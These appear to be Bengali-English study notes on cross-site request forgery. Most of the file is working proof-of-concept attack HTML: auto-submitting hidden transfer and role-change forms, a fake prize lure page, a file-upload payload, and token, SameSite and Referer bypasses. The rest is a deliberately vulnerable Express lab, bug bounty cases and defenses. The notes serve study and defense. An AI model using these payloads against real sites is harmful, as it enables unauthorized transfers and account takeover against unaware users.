# 🔁 Cross-Site Request Forgery (CSRF) — Detailed Study Notes

> **Also Known As:** XSRF, Sea Surf, Session Riding
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — CSRF কী?](#1-concept--csrf-কী)
2. [CSRF কীভাবে কাজ করে — Step by Step](#2-csrf-কীভাবে-কাজ-করে--step-by-step)
3. [CSRF vs XSS পার্থক্য](#3-csrf-vs-xss-পার্থক্য)
4. [Attack Techniques](#4-attack-techniques)
   - [HTML GET — User Interaction](#41-html-get--user-interaction)
   - [HTML GET — No Interaction](#42-html-get--no-interaction)
   - [HTML POST — User Interaction](#43-html-post--user-interaction)
   - [HTML POST — AutoSubmit](#44-html-post--autosubmit)
   - [File Upload CSRF](#45-file-upload-csrf)
   - [JSON GET/POST](#46-json-getpost)
5. [CSRF Token Bypass Techniques](#5-csrf-token-bypass-techniques)
6. [SameSite Cookie Bypass](#6-samesite-cookie-bypass)
7. [Referer Header Bypass](#7-referer-header-bypass)
8. [Real-World Bug Bounty Examples](#8-real-world-bug-bounty-examples)
9. [Practical Lab Setup](#9-practical-lab-setup)
10. [Testing Methodology](#10-testing-methodology)
11. [Defense Cheat Sheet](#11-defense-cheat-sheet)
12. [References](#12-references)

---

## 1. Concept — CSRF কী?

### Core Idea

```
CSRF = Cross-Site Request Forgery
     = অন্য site থেকে victim এর browser দিয়ে তার নামে request পাঠানো

Key insight:
  Browser automatically cookies পাঠায় প্রতিটা request এ!

  তুমি bank.com এ logged in → cookie আছে
  তুমি evil.com এ visit করো
  evil.com তোমার browser দিয়ে bank.com এ request পাঠায়
  Browser automatically bank.com এর cookie attach করে!
  Bank: "এটা তো valid authenticated request!"
  → Unauthorized action performed!
```

```
Real-World Analogy:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  ধরো তুমি তোমার bank এ গিয়ে sign করলে একটা blank check।  │
│                                                             │
│  Attacker সেই blank check এ নিজের নাম আর amount লিখলো।   │
│  Bank তোমার signature দেখে → valid! → টাকা transfer!       │
│                                                             │
│  CSRF এ:                                                   │
│    Session cookie = তোমার signature                         │
│    Browser = blank check                                    │
│    Attacker = check এ content লেখে                         │
│    Server = signature দেখে trust করে                       │
└─────────────────────────────────────────────────────────────┘
```

### CSRF দিয়ে কী করা যায়?

```
✅ Password change করা
✅ Email address change করা
✅ Bank transfer করা
✅ Profile information update
✅ Admin user add করা
✅ Account delete করা
✅ Social media post করা (Facebook, Twitter)
✅ Security settings change করা
✅ OAuth permissions grant করা

❌ CSRF দিয়ে কী করা যায় না:
   Data theft (response দেখা যায় না)
   কিন্তু action নেওয়া যায়!
```

---

## 2. CSRF কীভাবে কাজ করে — Step by Step

```
Complete Attack Flow:
┌────────────────────────────────────────────────────────────────────┐
│                                                                    │
│  Step 1: Victim logs into bank.com                                 │
│    Victim → POST bank.com/login → Session cookie set!             │
│    Cookie: session=abc123xyz                                       │
│                                                                    │
│  Step 2: Victim visits attacker's page                            │
│    Victim → GET evil.com/malicious.html                           │
│                                                                    │
│  Step 3: evil.com এর HTML load হয়:                               │
│    <img src="https://bank.com/transfer?to=attacker&amount=10000"> │
│                                                                    │
│  Step 4: Browser automatically requests bank.com:                  │
│    GET bank.com/transfer?to=attacker&amount=10000                 │
│    Cookie: session=abc123xyz  ← automatically added!              │
│                                                                    │
│  Step 5: Bank sees valid session → processes transfer!             │
│    "User abc123 transferred $10,000 to attacker!"                 │
│                                                                    │
│  Step 6: Victim has no idea what happened!                        │
└────────────────────────────────────────────────────────────────────┘
```

### Why Cookies Are Sent Automatically

```
Browser Cookie Policy (default):
  Any request to bank.com → browser sends bank.com cookies

  Doesn't matter:
  ✗ Where the request originated from (evil.com, legit.com, etc.)
  ✗ How the request was triggered (img tag, form, XHR)

  This is by design — for normal web browsing!
  CSRF abuses this legitimate behavior.
```

---

## 3. CSRF vs XSS পার্থক্য

```
┌──────────────────┬──────────────────────────────┬─────────────────────────────┐
│ Feature          │ XSS                           │ CSRF                        │
├──────────────────┼──────────────────────────────┼─────────────────────────────┤
│ Attack direction │ Site → User                  │ User → Site                 │
│ Needs victim's  │ Same origin cookie (via JS)   │ Yes (browser sends auto)    │
│ cookies          │                              │                             │
│ Can read response│ Yes (same origin)            │ No (cross-origin blocked)   │
│ Requires JS?     │ Yes (usually)                │ No (img/form works!)        │
│ Target           │ Client browser               │ Server action               │
│ What it does     │ Runs attacker's JS on victim │ Makes victim's browser send │
│                  │ browser                      │ unauthorized requests       │
│ Example          │ Steal cookies, keylogging    │ Transfer money, change pass │
└──────────────────┴──────────────────────────────┴─────────────────────────────┘
```

---

## 4. Attack Techniques

### 4.1 HTML GET — User Interaction

```html
<!-- Victim কে click করতে হবে -->
<a href="http://www.example.com/api/setusername?username=Hacked"> Click here to win a prize! 🎁 </a>

<!-- Social engineering দিয়ে click করাও:
  - Email এ পাঠাও
  - Forum/comment এ post করো
  - Phishing page এ embed করো -->
```

```
Attack scenario:
  Target: GitHub (profile username change)

  Attacker sends email:
  "Click to verify your account:
   http://attacker.com/redirect?to=github.com/api/user?username=HackedUser"

  Victim clicks → request goes to GitHub with their session cookie
  → Username changed to "HackedUser"!
```

### 4.2 HTML GET — No Interaction ⚡

```html
<!-- এটাই সবচেয়ে dangerous — user interaction লাগে না! -->
<!-- Victim page visit করলেই attack trigger হয় -->

<!-- Method 1: img tag -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" width="0" height="0" />
<!-- Browser img load করতে GET request পাঠায়! Invisible! -->

<!-- Method 2: script src -->
<script src="http://target.com/api/deleteaccount"></script>

<!-- Method 3: iframe -->
<iframe src="http://target.com/api/enableadmin" style="display:none"> </iframe>

<!-- Method 4: link preload -->
<link rel="preload" href="http://target.com/api/action" as="fetch" />

<!-- Method 5: CSS background -->
<div style="background:url('http://target.com/api/action')"></div>
```

### 4.3 HTML POST — User Interaction

```html
<!-- Victim কে Submit button click করতে হবে -->
<form action="http://www.example.com/api/changepassword" method="POST">
  <input type="hidden" name="new_password" value="hacked123" />
  <input type="hidden" name="confirm_password" value="hacked123" />
  <input type="submit" value="Click to claim your reward!" />
</form>
```

### 4.4 HTML POST — AutoSubmit ⚡ (No Interaction!)

```html
<!-- Page load এ automatically submit হয়! -->
<form
  id="csrf-form"
  action="http://www.example.com/api/setusername"
  enctype="text/plain"
  method="POST"
>
  <input name="username" type="hidden" value="Hacked_By_CSRF" />
</form>

<script>
  // DOM ready হলেই submit!
  document.getElementById('csrf-form').submit()
</script>
```

```html
<!-- More stealthy version: -->
<body onload="document.forms[0].submit()">
  <form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="5000" />
    <input type="hidden" name="to_account" value="attacker_account" />
  </form>
</body>
```

```html
<!-- Bank transfer CSRF PoC (complete example): -->
<!DOCTYPE html>
<html>
  <head>
    <title>Congratulations! You Won!</title>
  </head>
  <body>
    <h1>🎉 You've won a prize!</h1>
    <p>Processing your reward...</p>

    <!-- Hidden CSRF form -->
    <form
      id="csrf"
      action="https://vulnerable-bank.com/api/transfer"
      method="POST"
      style="display:none"
    >
      <input name="to_account" value="ATTACKER_ACCOUNT_NUMBER" />
      <input name="amount" value="10000" />
      <input name="currency" value="USD" />
      <input name="memo" value="Prize payment" />
    </form>

    <script>
      // Auto-submit on page load
      window.onload = function () {
        document.getElementById('csrf').submit()
      }
    </script>
  </body>
</html>
```

### 4.5 File Upload CSRF

```html
<!-- File upload এ CSRF — DataTransfer API ব্যবহার করে -->
<script>
  function triggerCSRF() {
    // Fake file তৈরি করো:
    const dT = new DataTransfer()
    const file = new File(['malicious-content'], 'payload.php')
    dT.items.add(file)

    // File input এ assign করো:
    document.forms['csrf_upload'][0].files = dT.files

    // Submit!
    document.forms['csrf_upload'].submit()
  }
</script>

<form
  name="csrf_upload"
  method="POST"
  action="https://target.com/upload"
  enctype="multipart/form-data"
  style="display:none"
>
  <input id="file" type="file" name="file" />
  <input type="submit" />
</form>

<button onclick="triggerCSRF()">Download Free Software 🎁</button>
```

### 4.6 JSON GET/POST

#### JSON GET (Simple)

```html
<script>
  // Simple GET with XHR:
  var xhr = new XMLHttpRequest()
  xhr.open('GET', 'http://www.example.com/api/currentuser')
  xhr.withCredentials = true // cookies পাঠাও!
  xhr.send()
  // Note: response পড়তে পারবো না (CORS blocked)
  // কিন্তু action trigger হবে!
</script>
```

#### JSON POST — Simple Request (No Preflight)

```html
<!-- application/json → preflight trigger করে! CORS blocks it.
     text/plain → "simple request" → no preflight! -->
<script>
  var xhr = new XMLHttpRequest()
  xhr.open('POST', 'http://www.example.com/api/setrole')
  xhr.setRequestHeader('Content-Type', 'text/plain')
  // Server যদি Content-Type check না করে → CSRF works!
  xhr.send('{"role":"admin"}')
</script>
```

#### JSON POST via HTML Form Trick

```html
<!-- Form দিয়ে JSON-like body পাঠানো (clever trick!): -->
<form id="CSRF_POC" action="https://target.com/api/setrole" enctype="text/plain" method="POST">
  <!-- name + value → body: {"role":"admin","x":""}  -->
  <input type="hidden" name='{"role":"admin", "x":"' value='"}' />
</form>

<script>
  document.getElementById('CSRF_POC').submit()
</script>

<!-- Resulting POST body:
  {"role":"admin", "x":"="}
  ↑ x="=" এর = sign আসে form encoding থেকে
  Server JSON parse করলে: role = "admin" ✅
-->
```

#### JSON POST — Complex Request (Preflight triggered)

```html
<script>
  var xhr = new XMLHttpRequest()
  xhr.open('POST', 'http://www.example.com/api/setrole')
  xhr.withCredentials = true
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
  xhr.send('{"role":"admin"}')
  // ⚠️ এটা preflight trigger করে
  // CORS properly configured থাকলে → blocked!
  // CORS misconfigured থাকলে → works!
</script>
```

---

## 5. CSRF Token Bypass Techniques

### What is CSRF Token?

```
CSRF Token = Random secret value যা server generate করে
             এবং form এ hidden field হিসেবে include করে।

Normal flow:
  1. GET /change-password → Server generates token → Form এ include
  2. POST /change-password + token → Server validates → OK

Attack blocked:
  Attacker এর evil.com → POST without valid token → REJECTED!
  (Attacker জানে না token কী!)
```

### Bypass 1: Token Missing Validation

```
Test: Token সহ request পাঠাও → 200 OK
Test: Token ছাড়া request পাঠাও → 200 OK? ← CSRF vulnerable!

curl -X POST https://target.com/change-password \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "new_password=hacked"
# No CSRF token → If 200 OK → VULNERABLE!
```

### Bypass 2: Token Validation Depends on Method

```
Some servers only validate CSRF token on POST, not GET.

GET /api/delete-account?id=123
→ No CSRF token check (GET request)
→ Use img tag or link → CSRF works!

Test:
  Original: POST /action + csrf_token=abc
  Attack:   GET /action (change method → no token needed!)
```

### Bypass 3: Token Present but Not Tied to Session

```
Vulnerability: Any valid token works, not just the victim's!

Normal: token must match the user's session
Vulnerable: any token from any session works!

Attack:
  1. Attacker logs in → gets their own CSRF token
  2. Use attacker's token in the CSRF attack form
  3. Server validates: "Is this a valid token?" → Yes (attacker's token is valid)
  4. Action performed on victim!
```

### Bypass 4: Token Tied to Non-Session Cookie

```
Vulnerability: CSRF token stored in a cookie + form field
Both must match but: attacker can set cookies!

Header injection → cookie injection → bypass
CRLF injection + header injection → new cookie → bypass
```

### Bypass 5: Referer-Based Validation Bypass

```
Server checks: Referer header must be from trusted domain

Bypass techniques:
  1. No Referer at all (browser sometimes omits it):
     <meta name="referrer" content="no-referrer">
     → Referer header not sent!

  2. Subdomain bypass:
     Trusted: "example.com"
     Attack: "example.com.evil.com" → contains "example.com"!

  3. Path bypass:
     Trusted: starts with "https://target.com"
     Attack URL: "https://evil.com?target.com/..." → bypass!
```

```html
<!-- Referer removal technique: -->
<html>
  <head>
    <!-- Remove Referer header from requests: -->
    <meta name="referrer" content="no-referrer" />
  </head>
  <body>
    <form action="https://target.com/action" method="POST">
      <input type="hidden" name="action" value="delete_account" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

### Bypass 6: Token Duplicated in Cookie

```
Pattern: CSRF token same value in cookie AND form field
Server checks: cookie == form field

Bypass:
  If attacker can set cookies (CRLF, subdomain, etc.):
  Set cookie: csrf=attacker_token
  Set form:   csrf=attacker_token
  Both match → bypass!
```

---

## 6. SameSite Cookie Bypass

### SameSite Attribute

```
Cookie: session=abc123; SameSite=Strict
         → Never sent cross-site → CSRF blocked!

Cookie: session=abc123; SameSite=Lax
         → Only sent on top-level navigation (link clicks, not img/form)
         → POST CSRF blocked
         → GET CSRF via link still works!

Cookie: session=abc123; SameSite=None; Secure
         → Always sent → CSRF possible!
         → Default in old browsers
```

### SameSite=Lax Bypass

```
Lax allows cookies on top-level GET navigation:
  Click a link → Cookies sent ✅
  Img src → Cookies NOT sent ❌
  Form POST from another site → Cookies NOT sent ❌

Bypass: Use GET request that triggers state change!
  GET /transfer?amount=1000&to=attacker → if server uses GET for state change
  → Victim clicks link → cookies sent → transfer done!
```

### Two Requests Technique (for new sessions)

```
Some sites set SameSite=None for the first 2 minutes:
  → New session cookies are "unsafe" briefly

Attack:
  1. Target logs in → Lax cookie
  2. Wait? No → Trick user to open new window first
  3. New window = new context = different rules?

(This is edge-case behavior, browser-specific)
```

---

## 7. Referer Header Bypass

```python
# Bypass methods:
bypasses = [
    # 1. No Referer (meta tag):
    '<meta name="referrer" content="no-referrer">',

    # 2. HTTPS → HTTP (Referer stripped):
    # Host CSRF page on HTTPS, target on HTTP
    # Browser strips Referer when going HTTPS→HTTP

    # 3. Subdomain trick:
    # Server checks: if "target.com" in referer:
    # Attack: referer = "https://target.com.attacker.com/..."

    # 4. Data URI:
    # No referer from data: URI
    'window.open("data:text/html,...CSRF_FORM...")',
]
```

---

## 8. Real-World Bug Bounty Examples

### PayPal Profile Picture CSRF (2016)

```
Vulnerability: No CSRF protection on profile picture update
Platform: PayPal.me

Attack:
  <img src="https://www.paypal.me/api/v1/updateProfilePhoto?url=ATTACKER_IMAGE">

Impact:
  Victim visits attacker's page → Profile photo changed without consent

Lesson: Even "low-impact" actions need CSRF protection!
```

### Facebook CSRF (Messenger)

```
Vulnerability: CSRF on messaging API endpoint
Platform: Messenger.com

Steps to find:
  1. Intercept normal API call
  2. Remove CSRF token from request
  3. Test if request still works
  → If yes → CSRF found!

Impact: Send messages, change settings on behalf of victim
```

### Twitter "Add to Collection" CSRF

```
HackerOne Report #100820
Endpoint: /i/tweet/add_to_collection

No CSRF token → Victim's tweet added to attacker's collection
Without victim's knowledge!
```

### Apple Beats Account Takeover CSRF

```
Platform: Beats by Dre (Apple)
Vulnerability: CSRF on account email change

Attack:
  <form action="https://beats.com/api/account/update" method="POST">
    <input name="email" value="attacker@evil.com">
  </form>

Impact: Account takeover! Attacker changes email → resets password → owns account
Bug Bounty: High severity
```

---

## 9. Practical Lab Setup

### Lab 1: PortSwigger CSRF Labs (Best!)

```
Free labs — step by step:

✅ Lab 1: CSRF with no defenses
   Basic CSRF → auto-submit form
   URL: portswigger.net/web-security/csrf/lab-no-defenses

✅ Lab 2: Token validation depends on method
   Change POST to GET → no token check

✅ Lab 3: Token validation depends on presence
   Remove token entirely → server doesn't check

✅ Lab 4: Token not tied to user session
   Use your own token for victim's session

✅ Lab 5: Token tied to non-session cookie
   Cookie injection → bypass

✅ Lab 6: Token duplicated in cookie
   Cookie + form duplication bypass

✅ Lab 7: Referer validation depends on header presence
   meta referrer no-referrer bypass

✅ Lab 8: Broken Referer validation
   Subdomain/path bypass
```

### Lab 2: নিজে বানাও — Vulnerable Express App

```bash
mkdir csrf-lab && cd csrf-lab
npm init -y
npm install express cookie-session ejs

cat > server.js << 'EOF'
const express = require('express');
const session = require('cookie-session');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');

// Session middleware (no SameSite protection in this lab):
app.use(session({
  name: 'session',
  keys: ['secret123'],
  maxAge: 24 * 60 * 60 * 1000,
  sameSite: false,  // ❌ No SameSite!
  httpOnly: true
}));

// Fake user database:
const users = {
  'alice': { password: 'alice123', email: 'alice@example.com', balance: 10000 }
};

// Login:
app.get('/login', (req, res) => {
  res.send(`
    <form method="POST" action="/login">
      <input name="username" placeholder="username">
      <input name="password" type="password" placeholder="password">
      <button>Login</button>
    </form>
  `);
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (users[username]?.password === password) {
    req.session.user = username;
    res.redirect('/profile');
  } else {
    res.send('Invalid credentials');
  }
});

// Profile (requires login):
app.get('/profile', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  const user = users[req.session.user];
  res.send(`
    <h1>Profile: ${req.session.user}</h1>
    <p>Email: ${user.email}</p>
    <p>Balance: $${user.balance}</p>
    <a href="/transfer">Transfer Money</a>
  `);
});

// ❌ VULNERABLE transfer (no CSRF protection):
app.get('/transfer', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  res.send(`
    <form method="POST" action="/transfer">
      <input name="to" placeholder="recipient">
      <input name="amount" type="number" placeholder="amount">
      <button>Transfer</button>
    </form>
    <!-- No CSRF token! -->
  `);
});

app.post('/transfer', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  const { to, amount } = req.body;

  // ❌ No CSRF token validation!
  users[req.session.user].balance -= parseInt(amount);

  res.send(`Transferred $${amount} to ${to}. New balance: $${users[req.session.user].balance}`);
});

app.listen(3000, () => console.log('CSRF Lab: http://localhost:3000'));
EOF

node server.js
```

```bash
# Attacker's CSRF page (save as attack.html, open separately):
cat > attack.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>You Won a Prize!</title></head>
<body>
  <h1>🎉 Congratulations! Claim your $1000 prize!</h1>

  <!-- Hidden CSRF form -->
  <form id="csrf-form" action="http://localhost:3000/transfer" method="POST"
        style="display:none">
    <input name="to" value="attacker">
    <input name="amount" value="9999">
  </form>

  <script>
    // Auto-submit when page loads!
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
EOF

# Steps:
# 1. Login to localhost:3000 as alice/alice123
# 2. Open attack.html in same browser
# 3. Check balance at localhost:3000/profile
# → Balance reduced! CSRF attack successful!
```

### Lab 3: XSRFProbe Tool

```bash
# Install:
pip3 install xsrfprobe

# Basic scan:
xsrfprobe -u https://target.com

# With authenticated session:
xsrfprobe -u https://target.com \
  --cookie "session=YOUR_SESSION_COOKIE"

# Specific endpoint:
xsrfprobe -u https://target.com/api/transfer \
  --cookie "session=abc123" \
  --POST

# Output: CSRF vulnerability assessment!
```

---

## 10. Testing Methodology

### Step 1: Find State-Changing Requests

```bash
# Burp Suite এ browse করো এবং এই patterns খোঁজো:
# - POST/PUT/DELETE requests
# - Account settings changes
# - Password/email changes
# - Financial transactions
# - Admin actions
# - Social actions (like, follow, post)

# State-changing GET requests also!
# - GET /logout
# - GET /delete?id=X
# - GET /approve?request=X
```

### Step 2: Check for CSRF Protection

```bash
# Request intercept করো (Burp)
# Look for:
#   - csrf_token=
#   - _csrf=
#   - authenticity_token=
#   - X-CSRF-Token header
#   - __RequestVerificationToken=

# যদি না থাকে → Potentially vulnerable!
```

### Step 3: Validate Token Absence

```bash
# Token সরিয়ে request পাঠাও:
curl -X POST https://target.com/change-email \
  -b "session=VICTIM_SESSION" \
  -d "email=attacker@evil.com"
# No CSRF token included

# যদি 200 OK → CSRF confirmed!
```

### Step 4: Test Bypass Techniques

```bash
# Test 1: Remove token entirely
POST /action
# body without csrf_token

# Test 2: Use invalid token
POST /action
csrf_token=invalid123

# Test 3: Use empty token
POST /action
csrf_token=

# Test 4: Change request method
GET /action?param=value  # instead of POST

# Test 5: Referer manipulation
curl -X POST https://target.com/action \
  --referer "https://target.com.evil.com" \
  -d "csrf_token=VALID_TOKEN"
```

### Step 5: Create PoC

```html
<!-- PortSwigger style PoC: -->
<html>
  <body>
    <form action="https://TARGET.com/SENSITIVE-ACTION" method="POST">
      <input type="hidden" name="param1" value="value1" />
      <input type="hidden" name="param2" value="value2" />
      <!-- No CSRF token! -->
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

---

## 11. Defense Cheat Sheet

### ✅ Fix 1: CSRF Token (Synchronizer Token Pattern)

```javascript
// Node.js — csurf middleware:
const csrf = require('csurf')
const csrfProtection = csrf({ cookie: true })

app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() })
})

app.post('/transfer', csrfProtection, (req, res) => {
  // csurf automatically validates token!
  // Invalid token → 403 Forbidden
  processTransfer(req.body)
})
```

```html
<!-- Form এ include করো: -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <!-- other fields -->
</form>
```

### ✅ Fix 2: SameSite Cookie Attribute

```javascript
// Express:
app.use(
  session({
    secret: 'strong-secret-key',
    cookie: {
      sameSite: 'strict', // ← No cross-site cookies!
      httpOnly: true,
      secure: true, // HTTPS only
    },
  }),
)
```

```
SameSite values:
  Strict → Never send cross-site (most secure, might break some flows)
  Lax    → Send on top-level navigation only (good balance)
  None   → Always send (requires Secure; don't use for sensitive sessions)
```

### ✅ Fix 3: Double Submit Cookie Pattern

```javascript
// Generate random token → store in cookie AND form field:
const token = crypto.randomBytes(32).toString('hex')
res.cookie('csrf', token, { httpOnly: false }) // JS readable
res.render('form', { csrf: token })

// Validate: cookie value == form value
app.post('/action', (req, res) => {
  const cookieToken = req.cookies.csrf
  const formToken = req.body.csrf

  if (!cookieToken || cookieToken !== formToken) {
    return res.status(403).send('CSRF validation failed')
  }
  // Proceed...
})
```

### ✅ Fix 4: Custom Request Headers

```javascript
// API endpoints এ custom header require করো:
// Cross-site requests can't set custom headers (CORS blocks it)!

app.post('/api/transfer', (req, res) => {
  const customHeader = req.headers['x-requested-with']
  if (customHeader !== 'XMLHttpRequest') {
    return res.status(403).send('CSRF: Missing required header')
  }
  // Proceed...
})
```

### ✅ Fix 5: Referer/Origin Validation

```javascript
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin
  const referer = req.headers.referer

  const allowedOrigins = ['https://yoursite.com', 'https://api.yoursite.com']

  if (!allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'CSRF: Invalid origin' })
  }
  // Proceed...
})
```

### Defense Summary

```
Attack                          → Fix
────────────────────────────────────────────────────────────────────────
No CSRF token                   → Add CSRF token (csurf, Django CSRF, etc.)

Token not validated             → Always validate! Check both presence + value

Token not tied to session       → Bind token to user session
                                  New session = new token

SameSite not set                → Always set SameSite=Strict or Lax

Referer bypass                  → Use CSRF tokens (not just Referer)
                                  Strict origin checking

GET state-changing requests     → Use POST/PUT/DELETE for state changes
                                  Never state-change on GET

JSON CSRF via text/plain        → Check Content-Type server-side
                                  Reject non-application/json for JSON APIs
```

---

## 12. References

| Resource               | Link                                                                                                                       |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings   | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)                   |
| OWASP CSRF             | [OWASP](https://owasp.org/www-community/attacks/Cross-Site_Request_Forgery)                                                |
| PortSwigger CSRF Labs  | [Web Security Academy](https://portswigger.net/web-security/csrf)                                                          |
| XSRFProbe Tool         | [GitHub](https://github.com/0xInfection/XSRFProbe)                                                                         |
| PwnFunction CSRF Video | [YouTube](https://www.youtube.com/watch?v=eWEgUcHPle0)                                                                     |
| PayPal CSRF Bug        | [HEthical Blog](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/) |
| Facebook Oculus CSRF   | [Josip Franjkovic](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)                          |
| CSRF Cheat Sheet       | [TrustFoundry](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)                                           |

---

> ✅ **Next Topic Suggestions:**
>
> - `XSS Injection/README.md` — XSS দিয়ে CSRF token steal করা যায়!
> - `Client Side Path Traversal/README.md` — CSPT2CSRF (আগে পড়েছি)
> - `CORS Misconfiguration/README.md` — Cross-origin attacks
> - `Account Takeover/README.md` — CSRF → ATO chain

> ⚠️ **Ethical Reminder:** CSRF PoC তৈরি করো শুধুমাত্র Bug Bounty scope এ বা নিজের lab এ। Real user এর উপর test করা illegal।
